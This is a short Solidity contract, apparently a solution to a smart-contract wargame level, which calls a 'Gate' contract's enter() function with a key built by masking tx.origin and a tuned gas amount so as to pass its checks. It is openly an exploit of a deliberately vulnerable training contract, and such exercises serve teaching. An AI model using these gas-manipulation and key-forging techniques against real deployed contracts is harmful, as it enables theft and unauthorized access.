pragma solidity ^0.4.0;

contract Gate {
    function enter(bytes8) external returns (bool);
}

contract AttackGateKeeper {
    Gate public gateKeeper = Gate(0x7CD437b6f550e603882Cd40275cf4B77B3132D64);
    bytes8 public byteKey = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;

    function callGate3() public {
        // bytes8 byteKey = convertBytes(msg.sender);
        gateKeeper.call.gas(84772)(bytes4(keccak256("enter(bytes8)")), byteKey);
    }
}
